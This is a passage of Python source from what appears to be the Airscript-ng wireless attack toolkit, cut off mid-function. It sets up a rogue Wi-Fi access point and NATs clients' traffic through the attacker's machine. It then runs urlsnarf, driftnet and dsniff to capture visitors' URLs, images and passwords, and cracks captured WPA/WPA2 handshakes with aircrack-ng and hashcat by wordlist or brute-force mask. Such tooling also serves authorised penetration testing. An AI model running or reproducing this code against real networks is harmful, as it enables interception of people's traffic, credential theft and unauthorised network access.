                            selectedOptionThree()
                        if thirdVariable == "":
                            unselectedOptionThree()
                        continue
                else:
                    break
            userConfirmation = input("\n\n\033[0;39;48mOptions correctly chosen [y/n]?\033[1;31;48m ~# \033[0;39;48m")
            if userConfirmation.lower().startswith("y"):
                clearTerm()
                print("\n")
                airbase = functions.getAvailableWifiCardsAlt("1")
                clearTerm()
                print("\n")
                inetface = functions.getAvailableWifiCardsAlt("2")
                global apHostMethod
                apOptionsArray = [["h","Hostapd"],["a","AIRBASE-NG"]]
                apHostMethod = ""
                print("\n%sIf unsure, choose [h]. Not working? choose [c]. %s\n" %(col.endl_deep,col.endl))
                def apToolChoice():
                    apHostMethod = input("\033[1;32;48m[+]\033[1;39;48mWhat shall I use to host the AP? [%sh%s]ostapd or [%sa%s]irbase-ng? \033[1;31;48m ~# \033[0;39;48m  " %(col.green_deep,col.endl_deep,col.green_deep,col.endl_deep))
                    for i,q in apOptionsArray:
                        if apHostMethod.lower() == i:
                            apHostMethod = q
                            return apHostMethod
                    return apToolChoice()
                apHostMethod = apToolChoice()
                global ssid
                ssid = input("\033[1;32;48m[?]\033[1;39;48mWhat shall I call the AP? (SSID) \033[1;31;48m ~# \033[0;39;48m ")
                ssid = str(ssid)
                global channelNumber
                channelNumber = input("\033[1;33;48m[?]\033[1;39;48mWhat channel shall I use? \033[1;31;48m ~# \033[0;39;48m ")
                channelNumber = str(channelNumber)
                global subnet
                subnet = input("\033[1;33;48m[?]\033[1;39;48mUse default subnet of \033[1;32;48m'192.168.1.x'\033[1;35;48m [y/n]? \033[1;31;48m ~# \033[0;39;48m ")
                subnet = str(subnet)
                global subnet2
                global subnet3
                subnet2 = "1"
                subnet3 = "0"
                if subnet.lower().startswith("n"):
                    subnet2 = input("\033[1;33;48m[?]\033[1;35;48mPlease enter the third digit of the subnet \033[1;31;48m ~# \033[0;39;48m ")
                    subnet3 = input("\033[1;33;48m[?]\033[1;35;48mPlease enter the fourth digit of the subnet \033[1;31;48m ~# \033[0;39;48m ")
                    subnet2 = str(subnet2)
                    subnet3 = str(subnet3)
                else:
                    pass
                if bashRun("sudo cat /etc/dhcp/dhcpd.conf | grep '#BY AIRSCRIPT-NG' >/dev/null 2>/dev/null") != 0:
                    bashRun("echo '#BY AIRSCRIPT-NG' >> /etc/dhcp/dhcpd.conf")
                    bashRun("echo 'default-lease-time 600;' >> /etc/dhcp/dhcpd.conf")
                    bashRun("echo 'max-lease-time 7200;' >> /etc/dhcp/dhcpd.conf")
                    bashRun("echo 'subnet 192.168.%s.%s netmask 255.255.255.0{' >> /etc/dhcp/dhcpd.conf" %(subnet2,subnet3))
                    bashRun("echo '    option subnet-mask 255.255.255.0;' >> /etc/dhcp/dhcpd.conf")
                    bashRun("echo '    option broadcast-address 192.168.%s.255;' >> /etc/dhcp/dhcpd.conf" %(subnet2))
                    bashRun("echo '    option domain-name-servers 8.8.8.8;' >> /etc/dhcp/dhcpd.conf")
                    global apAddr
                    apAddr = int(subnet3)
                    apAddr = apAddr + 1
                    bashRun("echo '    option routers 192.168.%s.%s;' >> /etc/dhcp/dhcpd.conf" %(subnet2,apAddr))
                    global subnet4 
                    global subnet5
                    global subnet6
                    subnet4 = int(subnet3)
                    subnet5 = subnet4 + 2
                    subnet6 = subnet4 + 100
                    subnet5 = str(subnet5)
                    subnet6 = str(subnet6)
                    bashRun("echo '    range 192.168.%s.%s 192.168.%s.%s;' >> /etc/dhcp/dhcpd.conf" %(subnet2,subnet5,subnet2,subnet6))
                    bashRun("echo '}' >> /etc/dhcp/dhcpd.conf")
                clearTerm()
                print(asciiArt)
                print("\n\033[1;34;48m-----------------------------------------OPTIONS-----------------------------------------\033[0;39;48m")
                #print("\n[\033[1;32;48mREQUIRED\033[1;39;48m]- Host-ap with airbase-ng (hostapd support comming soon!)")
                print("%s- %s" %(selectedOrUnselectedArray[2],allAvailableOptions[0]))
                if firstVariable != "":
                    selectedOptionOne()
                if secondVariable != "":
                    selectedOptionTwo()    
                if thirdVariable != "":
                    selectedOptionThree()
                print("\n[\033[1;32;48mINFO\033[1;39;48m]- AP HOSTING METHOD: %s" %(apHostMethod))
                print("[\033[1;32;48mINFO\033[1;39;48m]- SSID: %s" %(ssid))
                print("[\033[1;32;48mINFO\033[1;39;48m]- CHANNEL: %s" %(channelNumber))
                print("[\033[1;32;48mINFO\033[1;39;48m]- AP INTERFACE: %s" %(airbase))
                print("[\033[1;32;48mINFO\033[1;39;48m]- INTERNET INTERFACE: %s" %(inetface))
                print("[\033[1;32;48mINFO\033[1;39;48m]- SUBNET: 192.168.%s.x" %(subnet2))
                #Put details of AP, card, etc..
                print("\n\033[1;34;48m-----------------------------------------OPTIONS-----------------------------------------\033[0;39;48m")
                apStartFinalConfirmation = input("\n\n\033[0;39;48mStart AP [y/n]?\033[1;31;48m ~# \033[0;39;48m")
                #Finish this
                if apStartFinalConfirmation.lower().startswith("y"):
                    #START HERE
                    #c2 = urlsnarf 
                    #c3 = driftnet
                    #c4 = dsniff
                    #Common bashRun stuff here
                    if apHostMethod == "AIRBASE-NG":
                        def hostApWithAirbaseNg():
                            bashRun("rm ~/.airscriptNG/traffic-sniff.sh 2>/dev/null")
                            if bashRun("ls ~/.airscriptNG/traffic-sniff.sh >/dev/null 2>/dev/null") != 0:
                                bashRun("mkdir ~/.airscriptNG/ >/dev/null 2>/dev/null; touch ~/.airscriptNG/traffic-sniff.sh ; cd ~/.airscriptNG/;chmod +x traffic-sniff.sh")
                                bashRun("echo 'ip link set %s down ; iw dev %s set type monitor ; ip link set %s up'  >> ~/.airscriptNG/traffic-sniff.sh " %(airbase,airbase,airbase))
                                bashRun("echo 'sleep 3' >> ~/.airscriptNG/traffic-sniff.sh")
                                bashRun("echo 'ifconfig at0 192.168.%s.%s netmask 255.255.255.0' >> ~/.airscriptNG/traffic-sniff.sh" %(subnet2,apAddr))
                                bashRun("echo 'dhcpd at0' >> ~/.airscriptNG/traffic-sniff.sh")
                                bashRun("echo 'iptables --flush' >> ~/.airscriptNG/traffic-sniff.sh")
                                bashRun("echo 'iptables --table nat --flush' >> ~/.airscriptNG/traffic-sniff.sh")
                                bashRun("echo 'iptables --delete-chain' >> ~/.airscriptNG/traffic-sniff.sh")
                                bashRun("echo 'iptables --table nat --delete-chain' >> ~/.airscriptNG/traffic-sniff.sh")
                                bashRun("echo 'iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE' >> ~/.airscriptNG/traffic-sniff.sh" %(inetface))
                                bashRun("echo 'iptables --append FORWARD -j ACCEPT --in-interface at0' >> ~/.airscriptNG/traffic-sniff.sh")
                                bashRun("echo 'echo 1 > /proc/sys/net/ipv4/ip_forward' >> ~/.airscriptNG/traffic-sniff.sh")
                        hostApWithAirbaseNg()
                        if firstVariable != "" and secondVariable != "":
                            bashRun("sh ~/.airscriptNG/traffic-sniff.sh & xterm -geometry -7640 -title 'Hosting AP, CTRL+C to exit' -bg '#FFFFFF' -fg '#000000' -e 'airbase-ng -e %s -c %s %s' & xterm -geometry -4320+7640 -title 'Sniffing URLS and Links' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;urlsnarf -i at0 | cut -d \" \" -f 6,7,8' & xterm -geometry +4320 -title 'Sniffing Images' -bg '#FFFFFF' -fg '#000000' -e 'echo Starting in 5;sleep 1;echo 4;sleep 1;echo 3;sleep 1;echo 2;sleep 1;echo 1;sleep 1;clear;echo \"\nResize the Black window to your liking!\";driftnet -i at0' " %(ssid,channelNumber,airbase))
                        if firstVariable != "" and thirdVariable != "":
                            bashRun("sh ~/.airscriptNG/traffic-sniff.sh & xterm -geometry -7640 -title 'Hosting AP, CTRL+C to exit' -bg '#FFFFFF' -fg '#000000' -e 'airbase-ng -e %s -c %s %s' & xterm -geometry -4320+7640 -hold -title 'Sniffing URLS and Links' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;urlsnarf -i at0 | cut -d \" \" -f 6,7,8' & xterm -geometry +4320 -title 'Sniffing Passwords' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;dsniff -i at0' " %(ssid,channelNumber,airbase))
                        if secondVariable != "" and thirdVariable != "":
                            bashRun("sh ~/.airscriptNG/traffic-sniff.sh & xterm -geometry -7640 -title 'Hosting AP, CTRL+C to exit' -bg '#FFFFFF' -fg '#000000' -e 'airbase-ng -e %s -c %s %s' & xterm -geometry -4320+7640 -title 'Sniffing Images' -bg '#FFFFFF' -fg '#000000' -e 'echo Starting in 5;sleep 1;echo 4;sleep 1;echo 3;sleep 1;echo 2;sleep 1;echo 1;sleep 1;clear;echo \"\nResize the Black window to your liking!\";driftnet -i at0' & xterm -geometry +4320 -title 'Sniffing Passwords' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;dsniff -i at0' " %(ssid,channelNumber,airbase))
                    #END HERE
                    #START THE NEXT ONE HERE
                    elif apHostMethod == "Hostapd":
                        def hostApWithHostapd():
                            bashRun("rm ~/.airscriptNG/traffic-sniff.sh 2>/dev/null")
                            if bashRun("ls ~/.airscriptNG/traffic-sniff.sh >/dev/null 2>/dev/null") != 0:
                                bashRun("mkdir ~/.airscriptNG/ >/dev/null 2>/dev/null; touch ~/.airscriptNG/traffic-sniff.sh ; cd ~/.airscriptNG/;chmod +x traffic-sniff.sh")
                                bashRun("echo 'sleep 3' >> ~/.airscriptNG/traffic-sniff.sh")
                                bashRun("echo 'ifconfig %s 192.168.%s.%s netmask 255.255.255.0' >> ~/.airscriptNG/traffic-sniff.sh" %(airbase,subnet2,apAddr))
                                bashRun("echo 'dhcpd %s' >> ~/.airscriptNG/traffic-sniff.sh" %(airbase))
                                bashRun("echo 'iptables --flush' >> ~/.airscriptNG/traffic-sniff.sh")
                                bashRun("echo 'iptables --table nat --flush' >> ~/.airscriptNG/traffic-sniff.sh")
                                bashRun("echo 'iptables --delete-chain' >> ~/.airscriptNG/traffic-sniff.sh")
                                bashRun("echo 'iptables --table nat --delete-chain' >> ~/.airscriptNG/traffic-sniff.sh")
                                bashRun("echo 'iptables --table nat --append POSTROUTING --out-interface %s -j MASQUERADE' >> ~/.airscriptNG/traffic-sniff.sh" %(inetface))
                                bashRun("echo 'iptables --append FORWARD -j ACCEPT --in-interface %s' >> ~/.airscriptNG/traffic-sniff.sh" %(airbase))
                                bashRun("echo 'echo 1 > /proc/sys/net/ipv4/ip_forward' >> ~/.airscriptNG/traffic-sniff.sh")
                        hostApWithHostapd()
                        check_for_hostapd = bashReturnValue("ls ~/.airscriptNG/hostapd.conf ")
                        if check_for_hostapd == '0':
                            bashRun("rm ~/.airscriptNG/hostapd.conf >/dev/null 2>/dev/null")
                        bashRun("touch ~/.airscriptNG/hostapd.conf")
                        bashRun("echo 'interface=%s' >> ~/.airscriptNG/hostapd.conf" %(airbase))
                        bashRun("echo 'driver=nl80211' >> ~/.airscriptNG/hostapd.conf")
                        bashRun("echo 'ssid=%s' >> ~/.airscriptNG/hostapd.conf" %(ssid))
                        bashRun("echo 'channel=%s' >> ~/.airscriptNG/hostapd.conf" %(channelNumber))
                        bashRun("killall hostapd 2>/dev/null")
                        bashRun("nmcli dev set %s managed no" %(airbase))
                        if firstVariable != "" and secondVariable != "":
                            bashRun("sh ~/.airscriptNG/traffic-sniff.sh & xterm -hold -geometry -7640 -title 'Hosting AP, CTRL+C and close all windows to exit' -bg '#FFFFFF' -fg '#000000' -e 'nmcli dev set %s managed no && hostapd ~/.airscriptNG/hostapd.conf' & xterm -geometry -4320+7640 -title 'Sniffing URLS and Links' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;urlsnarf -i %s | cut -d \" \" -f 6,7,8' & xterm -geometry +4320 -title 'Sniffing Images' -bg '#FFFFFF' -fg '#000000' -e 'echo Starting in 5;sleep 1;echo 4;sleep 1;echo 3;sleep 1;echo 2;sleep 1;echo 1;sleep 1;clear;echo \"\nResize the Black window to your liking!\";driftnet -i %s' " %(airbase,airbase,airbase))
                        if firstVariable != "" and thirdVariable != "":
                            bashRun("sh ~/.airscriptNG/traffic-sniff.sh & xterm -hold -geometry -7640 -title 'Hosting AP, CTRL+C and close all windows to exit' -bg '#FFFFFF' -fg '#000000' -e 'nmcli dev set %s managed no && hostapd ~/.airscriptNG/hostapd.conf' & xterm -geometry -4320+7640 -hold -title 'Sniffing URLS and Links' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;urlsnarf -i %s | cut -d \" \" -f 6,7,8' & xterm -geometry +4320 -title 'Sniffing Passwords' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;dsniff -i %s' " %(airbase,airbase,airbase))
                        if secondVariable != "" and thirdVariable != "":
                            bashRun("sh ~/.airscriptNG/traffic-sniff.sh & xterm -hold -geometry -7640 -title 'Hosting AP, CTRL+C and close all windows to exit' -bg '#FFFFFF' -fg '#000000' -e 'nmcli dev set %s managed no && hostapd ~/.airscriptNG/hostapd.conf' & xterm -geometry -4320+7640 -title 'Sniffing Images' -bg '#FFFFFF' -fg '#000000' -e 'echo Starting in 5;sleep 1;echo 4;sleep 1;echo 3;sleep 1;echo 2;sleep 1;echo 1;sleep 1;clear;echo \"\nResize the Black window to your liking!\";driftnet -i %s' & xterm -geometry +4320 -title 'Sniffing Passwords' -bg '#FFFFFF' -fg '#000000' -e 'sleep 5;dsniff -i %s' " %(airbase,airbase,airbase))
                    #END HERE FOR HOSTAPD
                    def runOnExit():
                        if bashReturnValue("sudo cat /etc/dhcp/dhcpd.conf | grep '#BY AIRSCRIPT-NG' ") == '0':
                            bashRun("kill $(ps | grep xterm | awk -F ' ' {'print $1'}) 2>/dev/null ")
                            bashRun("ip link set %s down; iw dev %s set type managed; ip link set %s up" %(airbase,airbase,airbase))
                            bashRun("head -n -10 /etc/dhcp/dhcpd.conf > .dhconfhelp.txt; mv .dhconfhelp.txt /etc/dhcp/dhcpd.conf")
                            bashRun("iptables --flush")
                            bashRun("iptables --table nat --flush")
                            bashRun("iptables --delete-chain")
                            bashRun("iptables --table nat --delete-chain")
                            bashRun("service isc-dhcp-server stop")
                            bashRun("rm /var/run/dhcpd.pid 2>/dev/null")
                            bashRun("killall hostapd 2>/dev/null")
                            bashRun("killall xterm 2>/dev/null")
                            bashRun("nmcli dev set %s managed yes" %(airbase))
                            bashRun("rm ~/.airscriptNG/traffic-sniff.sh 2>/dev/null")
                            bashRun("rm ~/.airscriptNG/hostapd.conf >/dev/null 2>/dev/null")
                            clearTerm()
                    atexit.register(runOnExit)
                elif apStartFinalConfirmation.lower().startswith("n"):
                    mainMenu()
            elif userConfirmation.lower().startswith("n"):
                mainMenu()
            elif userConfirmation != "y" or userConfirmation != "n":
                mainMenu()
        #WILL HOST THE CODE TO CREATE FAKE AP, RETRACE STEPS AND CONDUCT TMUX IN XTERM WITH DIFFERENT POSITIONS.
        #xterm -geometry 125x35+4320 -bg '#FFFFFF' -fg '#000000' THIS MAKES IT APPEAR TOP RIGHT
        #xterm -geometry 125x35+4320+7640 -bg '#FFFFFF' -fg '#000000' BOTTOM RIGHT
        #xterm -geometry 125x35-4320+7640 -bg '#FFFFFF' -fg '#000000' BOTTOM LEFT
        #xterm -geometry 125x35-7640 -bg '#FFFFFF' -fg '#000000' TOP LEFT try 87x25
        #ENCLOSE THIS IN A TRY/EXCEPT LOOP
        #bashRun("echo -n \"\033[0;39;48m // \033[1;33;48mChipset:\033[0;39;48m \"; echo $(airmon-ng | awk -F ' ' {'print $4,$5,$6,$7'} | grep -v Chipset) ")
        except(KeyboardInterrupt,EOFError,TypeError,TabError,NameError):
            if bashReturnValue("sudo cat /etc/dhcp/dhcpd.conf | grep '#BY AIRSCRIPT-NG' ") == '0':
                bashRun("kill $(ps | grep xterm | awk -F ' ' {'print $1'}) 2>/dev/null")
                bashRun("ip link set %s down; iw dev %s set type managed; ip link set %s up" %(airbase,airbase,airbase))
                bashRun("head -n -10 /etc/dhcp/dhcpd.conf > .dhconfhelp.txt; mv .dhconfhelp.txt /etc/dhcp/dhcpd.conf")
                bashRun("iptables --flush")
                bashRun("iptables --table nat --flush")
                bashRun("iptables --delete-chain")
                bashRun("iptables --table nat --delete-chain")
                bashRun("service isc-dhcp-server stop")
                bashRun("rm /var/run/dhcpd.pid 2>/dev/null")
                bashRun("killall hostapd 2>/dev/null")
                bashRun("killall xterm 2>/dev/null")
                bashRun("nmcli dev set %s managed yes" %(airbase))
                bashRun("rm ~/.airscriptNG/traffic-sniff.sh 2>/dev/null")
                bashRun("rm ~/.airscriptNG/hostapd.conf >/dev/null 2>/dev/null")
                clearTerm()
            else:
                clearTerm()
            #import traceback,sys#remove this
            #print(traceback.format_exc())#remove this
            #print(sys.exc_info()[0])#remove
            #print(error_no)#remove
            os._exit(1)
    #This function will allow a user to crack a WPA/WPA2 handshake file (.cap file)
    def crackCaptureFile():
        #Start here
        try:
            print("\033[1;33;48m[-] \033[0;37;48mChecking for dependancies")
            functions.checkDependencies()
            functions.gitDeps()
            while True:
                clearTerm()
                menuArt = ("""\033[0;33;48m

             ██████╗██████╗  █████╗  ██████╗██╗  ██╗        ██████╗ █████╗ ██████╗ 
            ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝       ██╔════╝██╔══██╗██╔══██╗
            ██║     ██████╔╝███████║██║     █████╔╝        ██║     ███████║██████╔╝
            ██║     ██╔══██╗██╔══██║██║     ██╔═██╗        ██║     ██╔══██║██╔═══╝ 
            ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗    ██╗╚██████╗██║  ██║██║     
             ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     

            \033[0;39;48m
                        """)
                print(menuArt)
                print("\n\033[1;34;48mType [1] - Crack the WPA-HANDSHAKE with CPU")
                print("\033[1;32;48mType [2] - Crack the WPA-HANDSHAKE with GPU (Much faster)")
                print("\n\n\033[1;37;40mType [99] - Return to menu")
                global chooseCpuOrGpu
                chooseCpuOrGpu = input("\033[0;39;48m\n|MENU|PRE-EXISTING_HANDSHAKE|\033[0;32;48m(ENTER CHOICE\033[0;39;48m) \033[1;31;48m~# \033[0;39;48m")
                if chooseCpuOrGpu != "":
                    break
            chooseCpuOrGpu = str(chooseCpuOrGpu)
            if chooseCpuOrGpu == "1": #CPU CRACK SECTION
                from tkinter.filedialog import askopenfilename, Tk as capture
                capture().withdraw()
                global cpucrack
                somepath = input("\nPlease specify a .cap file. (press enter) \033[1;31;48m~# \033[0;39;48m")
                cpucrack = askopenfilename()
                cpucrack = str(cpucrack)
                print("\n[\033[1;32;48mCAP FILE\033[1;39;48m]: %s" %(cpucrack))
                input("\nPlease specify a Wordlist. (press enter) \033[1;31;48m~# \033[0;39;48m")
                wordcrack = askopenfilename()
                wordcrack = str(wordcrack)
                try:
                    bashRun("aircrack-ng %s -w %s" %(cpucrack,wordcrack))
                except(KeyboardInterrupt,EOFError):
                    bashRun("kill $(ps aux | grep -i \"aircrack-ng\" | awk -F ' ' {'print $2'}) 2>/dev/null")
                    print("Recieved TERMINATE signal, quitting...")
                    functions.silentExit()
                print("\n")
                functions.silentExit()
            elif chooseCpuOrGpu == "2": #GPU CRACK SECTION
                from tkinter import filedialog
                from tkinter.filedialog import askopenfilename, Tk as captured
                captured().withdraw()
                global captureFilePath
                somepath = input("\nPlease specify a .cap file. Must not be cleaned with \033[1;33;48mWPACLEAN\033[0;39;48m or such. (press enter) \033[1;31;48m~# \033[0;39;48m")
                captureFilePath = askopenfilename()
                captureFilePath = str(captureFilePath)
                print("\n[\033[1;32;48mCAP FILE\033[1;39;48m]: %s" %(captureFilePath))
                while True:
                    hashcatInstallerChoice = input("\nHave you installed hashcat and the drivers using option [6] from the menu? [y/n] \033[1;31;48m~# \033[0;39;48m")
                    if hashcatInstallerChoice.lower().startswith("n"):
                        functions.hashcatDownloadFunction()
                        functions.driverDownloadFunction()
                        clearTerm()
                        break
                    if hashcatInstallerChoice.lower().startswith("y"):
                        break
                    else:
                        clearTerm()
                        continue
                input("\n\033[1;39;48mWhere is the hashcat directory? Please click inside the hashcat-x.x-x folder and press ok. (press enter) \033[1;31;48m~# \033[0;39;48m")
                global hashcatDirectoryPath
                captured().withdraw()
                hashcatDirectoryPath = filedialog.askdirectory()
                hashcatDirectoryPath = str(hashcatDirectoryPath)
                def hashcatFunction():
                    global mainWordList
                    mainWordList = "N/A"
                    clearTerm()
                    print(menuArt)
                    print("\n[\033[1;32;48mCAP FILE\033[1;39;48m]: %s" %(captureFilePath))
                    print("[\033[1;32;48mHASHCAT PATH\033[1;39;48m]: %s" %(hashcatDirectoryPath))
                    print("[\033[1;32;48mWORDLIST\033[1;39;48m]: %s" %(mainWordList))
                    def optionDisplayMenu():
                        clearTerm()
                        print(menuArt)
                        print("\n[\033[1;32;48mCAP FILE\033[1;39;48m]: %s" %(captureFilePath))
                        print("[\033[1;32;48mHASHCAT PATH\033[1;39;48m]: %s" %(hashcatDirectoryPath))
                        print("[\033[1;32;48mHASHCAT-UTILS PATH\033[1;39;48m]: %s" %(hashcatUtilsPath))
                        print("[\033[1;32;48mWORDLIST\033[1;39;48m]: %s" %(mainWordList))
                        print("[\033[1;32;48mATTACK MODE\033[1;39;48m]: %s" %(hashcatAttackMode))
                        print("[\033[1;32;48mTEMPERATURE RETAIN\033[1;39;48m]: %s" %(gpuTemperatureRetain))
                        print("[\033[1;32;48mTEMPERATURE ABORT\033[1;39;48m]: %s" %(gpuMaximumTemperature))
                    if mainWordList == "N/A":
                        global hashcatAttackMode
                        global hashcatUtilsPath
                        global gpuMaximumTemperature
                        global gpuTemperatureRetain
                        print("\n\033[1;33;48mWordlist not chosen yet. Your options are:\033[1;39;48m")
                        print("\n\033[1;34;48mType [1] - Choose a wordlist/dictionary and start cracking.")
                        print("\033[1;35;48mType [2] - Use keyspace brute-force, no wordlist needed")
                        print("\033[1;37;48mType [3] - Use a built-in wordlists, from Skull-security")
                        print("\n\n\033[1;37;40mType [99] - Return to menu \033[0;39;48m")
                        global wordlistTypeChoice
                        wordlistTypeChoice = input("\n\033[0;39;48mEnter choice \033[1;31;48m~# \033[0;39;48m")
                        if wordlistTypeChoice == "1":
                            hashcatAttackMode = "Standard user-chosen wordlist"
                            input("\nReady to choose a \033[1;33;48mWordlist?\033[0;39;48m. (press enter) \033[1;31;48m~# \033[0;39;48m")
                            mainWordList = askopenfilename()
                            mainWordList = str(mainWordList)
                            input("Please locate and click inside the \033[1;33;48mHashcat-utils\033[0;39;48m directory. Remember to click inside and press ok! (press enter) \033[1;31;48m~# \033[0;39;48m")
                            hashcatUtilsPath = filedialog.askdirectory()
                            hashcatUtilsPath = str(hashcatUtilsPath)
                            while True:
                                gpuTemperatureRetain = input("What temperature do you want to retain? (degress celsius) \033[1;31;48m~# \033[0;39;48m")
                                gpuMaximumTemperature = input("What should be the cutoff/maximum temperature limit? (degress celsius) \033[1;31;48m~# \033[0;39;48m")
                                gpuTemperatureRetain = int(gpuTemperatureRetain)
                                gpuMaximumTemperature = int(gpuMaximumTemperature)
                                if gpuTemperatureRetain <= 80 and gpuMaximumTemperature <= 85:
                                    gpuTemperatureRetain = str(gpuTemperatureRetain)
                                    gpuMaximumTemperature = str(gpuMaximumTemperature)
                                    break
                                else:
                                    gpuTemperatureRetain = str(gpuTemperatureRetain)
                                    gpuMaximumTemperature = str(gpuMaximumTemperature)
                                    print("\n\033[1;31;48mTemperature value inappropriate! Please input proper and safe values.\033[0;39;48m [\033[1;32;48m<80c for retain \033[0;39;48m and \033[1;32;48m<85c for max\033[0;39;48m]")
                                    continue
                            optionDisplayMenu()
                            if bashReturnValue("ls ~/.airscriptNG/ ") != '0':
                                bashRun("mkdir ~/.airscriptNG/ 2>/dev/null")
                            if input("\n\033[0;39;48mOptions correctly chosen? Start cracking? [y/n] \033[1;31;48m~# \033[0;39;48m").lower().startswith("y"):
                                if bashReturnValue("ls ~/.airscriptNG/HANDSHAKEFILE ") != '0':
                                    bashRun("touch ~/.airscriptNG/HANDSHAKEFILE")
                                bashRun("cd %s/src/ && ./cap2hccapx.bin %s ~/.airscriptNG/HANDSHAKEFILE && cd %s/ && ./hashcat64.bin -a 0 -m 2500 ~/.airscriptNG/HANDSHAKEFILE %s --gpu-temp-retain=%s --gpu-temp-abort=%s -D 2 && echo '\n\nHere is any cracked hashes:' && cat %s/hashcat.potfile && echo '\n'" %(hashcatUtilsPath,captureFilePath,hashcatDirectoryPath,mainWordList,gpuTemperatureRetain,gpuMaximumTemperature,hashcatDirectoryPath))
                                bashRun("rm ~/.airscriptNG/HANDSHAKEFILE 2>/dev/null")
                                bashRun("rm -r ~/.airscriptNG/Dependencies-for-Airscript-ng/ 2>/dev/null")
                                bashRun("rm %s/hashcat.potfile %s/hashcat.log" %(hashcatDirectoryPath,hashcatDirectoryPath))
                                functions.menuOrExit()
                                #functions.silentExit()
                            else:
                                mainMenu()
                        elif wordlistTypeChoice == "2":
                            hashcatAttackMode = "Keyspace bruteforce"
                            mainWordList = str("Not applicable")
                            input("\nPlease locate and click inside the \033[1;33;48mHashcat-utils\033[0;39;48m directory. Remember to click inside and press ok! (press enter) \033[1;31;48m~# \033[0;39;48m")
                            hashcatUtilsPath = filedialog.askdirectory()
                            hashcatUtilsPath = str(hashcatUtilsPath)
                            #PROVIDE OPTIONS TO VIEW KEYSPACE TABLE HERE
                            if bashReturnValue("ls ~/.airscriptNG/ ") != '0':
                                bashRun("mkdir ~/.airscriptNG/ 2>/dev/null")
                            if bashReturnValue("ls ~/.airscriptNG/Dependencies-for-Airscript-ng/router-keyspaces.txt ") != '0':
                                bashRun("cd ~/.airscriptNG/ && git clone https://github.com/Sh3llcod3/Dependencies-for-Airscript-ng.git")
                            while True:
                                clearTerm()
                                print("\n\033[1;33;48mTo brute-force the keyspace, you need to enter a mask/charset.\033[1;39;48m")
                                print("\n\033[1;34;48mType [1] - I understand what a hashcat mask/charset is and want to proceed.")
                                print("\033[1;35;48mType [2] - What is a mask/charset? How do I enter one? View documentation.")
                                hashcatBruteForceOptions = input("\n\033[0;39;48mEnter choice \033[1;31;48m~# \033[0;39;48m")
                                if hashcatBruteForceOptions == "1":
                                    break
                                if hashcatBruteForceOptions == "2":
                                    bashRun("cat ~/.airscriptNG/Dependencies-for-Airscript-ng/router-keyspaces.txt | less")
                                    continue
                            while True:
                                bashRun("clear")
                                print("""
        - [ Built-in Charsets ] -

          ? | Charset
         ===+=========
          l | abcdefghijklmnopqrstuvwxyz
          u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
          d | 0123456789
          h | 0123456789abcdef
          H | 0123456789ABCDEF
          s |  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
          a | ?l?u?d?s
          b | 0x00 - 0xff

        """)
                                print("This is a very \033[1;31;48mcrucial\033[0;39;48m step. If you are confused, type [help] to view the documentation again.")
                                global hashcatBruteForceMask 
                                hashcatBruteForceMask = input("\nPlease enter a \033[1;33;48mMask/Charset.\033[0;39;48m For example:\033[1;32;48m?u?u?u?u?u?u?u?u\033[0;39;48m or \033[1;32;48mABCD?u?u?u?u\033[0;39;48m \033[1;31;48m~# \033[0;39;48m")
                                if hashcatBruteForceMask.lower().startswith("help"):
                                    bashRun("cat ~/.airscriptNG/Dependencies-for-Airscript-ng/router-keyspaces.txt | less")
                                    continue
                                if hashcatBruteForceMask != "":
                                    break
                                else:
                                    continue
                            while True:
                                gpuTemperatureRetain = input("What temperature do you want to retain? (degress celsius) \033[1;31;48m~# \033[0;39;48m")
                                gpuMaximumTemperature = input("What should be the cutoff/maximum temperature limit? (degress celsius) \033[1;31;48m~# \033[0;39;48m")
                                gpuTemperatureRetain = int(gpuTemperatureRetain)
                                gpuMaximumTemperature = int(gpuMaximumTemperature)
                                if gpuTemperatureRetain <= 80 and gpuMaximumTemperature <= 85:
                                    gpuTemperatureRetain = str(gpuTemperatureRetain)
                                    gpuMaximumTemperature = str(gpuMaximumTemperature)
                                    break
                                else:
                                    gpuTemperatureRetain = str(gpuTemperatureRetain)
                                    gpuMaximumTemperature = str(gpuMaximumTemperature)
                                    print("\n\033[1;31;48mTemperature value inappropriate! Please input proper and safe values.\033[0;39;48m [\033[1;32;48m<80c for retain \033[0;39;48m and \033[1;32;48m<85c for max\033[0;39;48m]")
                                    continue
                            optionDisplayMenu()
                            print("[\033[1;32;48mINPUT MASK/CHARSET\033[1;39;48m]: %s" %(hashcatBruteForceMask))
                            if bashReturnValue("ls ~/.airscriptNG/ ") != '0':
                                bashRun("mkdir ~/.airscriptNG/ 2>/dev/null")
                            if input("\n\033[0;39;48mOptions correctly chosen? Start cracking? [y/n] \033[1;31;48m~# \033[0;39;48m").lower().startswith("y"):
                                if bashReturnValue("ls ~/.airscriptNG/HANDSHAKEFILE ") != '0':
                                    bashRun("touch ~/.airscriptNG/HANDSHAKEFILE")
                                bashRun("cd %s/src/ && ./cap2hccapx.bin %s ~/.airscriptNG/HANDSHAKEFILE && cd %s/ && ./hashcat64.bin -a 3 -m 2500 ~/.airscriptNG/HANDSHAKEFILE %s --gpu-temp-retain=%s --gpu-temp-abort=%s -D 2 && echo '\n\nHere is any cracked hashes:' && cat %s/hashcat.potfile && echo '\n'" %(hashcatUtilsPath,captureFilePath,hashcatDirectoryPath,hashcatBruteForceMask,gpuTemperatureRetain,gpuMaximumTemperature,hashcatDirectoryPath))
                                bashRun("rm ~/.airscriptNG/HANDSHAKEFILE 2>/dev/null")
                                bashRun("rm -r ~/.airscriptNG/Dependencies-for-Airscript-ng/ 2>/dev/null")
                                bashRun("rm %s/hashcat.potfile %s/hashcat.log" %(hashcatDirectoryPath,hashcatDirectoryPath))
                                functions.menuOrExit()
                                #functions.silentExit()
                            #End here
                            optionDisplayMenu()
                        elif wordlistTypeChoice == "3":
